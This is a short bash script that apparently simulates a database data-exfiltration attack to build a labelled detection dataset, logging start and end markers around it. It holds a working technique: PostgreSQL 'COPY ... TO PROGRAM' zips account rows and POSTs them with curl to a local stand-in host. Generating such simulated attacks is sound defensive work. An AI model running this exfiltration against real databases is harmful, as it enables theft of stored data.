#!/bin/bash
echo "Simulating Data Exfiltration Attack (zip + curl)..."
/dataset_workspace/logger.sh mark_attack "attack_exfil_zip_curl" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'zip -q /tmp/exfil_zip_curl.dat - && curl -s -X POST -d @/tmp/exfil_zip_curl.dat http://127.0.0.1:9090 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_exfil_zip_curl" end
